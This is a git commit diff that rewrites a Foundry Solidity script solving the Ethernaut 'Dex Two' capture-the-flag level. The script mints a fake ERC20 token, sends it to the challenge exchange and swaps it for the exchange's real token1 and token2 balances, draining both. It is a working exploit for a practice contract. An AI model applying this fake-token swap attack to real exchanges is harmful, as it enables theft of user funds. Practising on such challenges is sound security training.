27307532b4f20e9a6baa6d873f08871462267405
bufrr <chouyc.adam@gmail.com>
2024-09-19 22:30:05 +0800

    bytenoob 0919

--- Writeup/bytenoob/script/Ethernaut/dex2.s.sol
+++ Writeup/bytenoob/script/Ethernaut/dex2.s.sol
@@ -2,24 +2,62 @@
 pragma solidity ^0.8.0;
 import "forge-std/Script.sol";
 import "forge-std/console2.sol";
-import "../../src/Ethernaut/dex2.sol";
+
+interface IDex2 {
+    function swap(address from, address to, uint256 amount) external;
+
+    function token1() external returns (address);
+    function token2() external returns (address);
+    function approve(address spender, uint256 amount) external;
+    function balanceOf(
+        address token,
+        address account
+    ) external returns (uint256);
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
 
 contract AttackDexScript is Script {
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        address level23 = 0x0a4Dee5fc56eB9c00363016619859E69B43efc23;
-        DexTwo dex = DexTwo(payable(level23));
+        address level23 = 0x788D241Dc258aaE8C9b16549D337132629938E57;
+        IDex2 dex = IDex2(payable(level23));
         address token1 = dex.token1();
         address token2 = dex.token2();
 
         dex.approve(address(dex), type(uint256).max);
 
-        FakeToken fakeToken = new FakeToken(address(dex));
-        fakeToken.approve(address(dex), type(uint256).max);
-        fakeToken.mint(address(dex), 100);
+        FakeToken faketoken_contract = new FakeToken();
+        faketoken_contract.mint(400);
+        faketoken_contract.approve(address(dex), type(uint256).max);
+        faketoken_contract.transfer(address(dex), 100);
 
-        dex.swap(token1, address(fakeToken), 100);
-        dex.swap(address(fakeToken), token2, 100);
+        IDex2(level23).swap(address(faketoken_contract), token1, 100);
+        IDex2(level23).swap(address(faketoken_contract), token2, 200);
 
         console.log("Balance of token1", dex.balanceOf(token1, address(dex)));
         console.log("Balance of token2", dex.balanceOf(token2, address(dex)));
@@ -28,12 +66,48 @@ contract AttackDexScript is Script {
     }
 }
 
-contract FakeToken is SwappableTokenTwo {
-    constructor(
-        address dexInstance
-    ) SwappableTokenTwo(dexInstance, "FakeToken", "FAKE", 100) {}
+contract FakeToken is IERC20 {
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
 
-    function mint(address to, uint256 amount) public {
-        super._mint(to, amount);
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[recipient] += amount;
+        emit Transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool) {
+        allowance[sender][msg.sender] -= amount;
+        balanceOf[sender] -= amount;
+        balanceOf[recipient] += amount;
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function mint(uint256 amount) external {
+        balanceOf[msg.sender] += amount;
+        totalSupply += amount;
+        emit Transfer(address(0), msg.sender, amount);
+    }
+
+    function burn(uint256 amount) external {
+        balanceOf[msg.sender] -= amount;
+        totalSupply -= amount;
+        emit Transfer(msg.sender, address(0), amount);
     }
 }
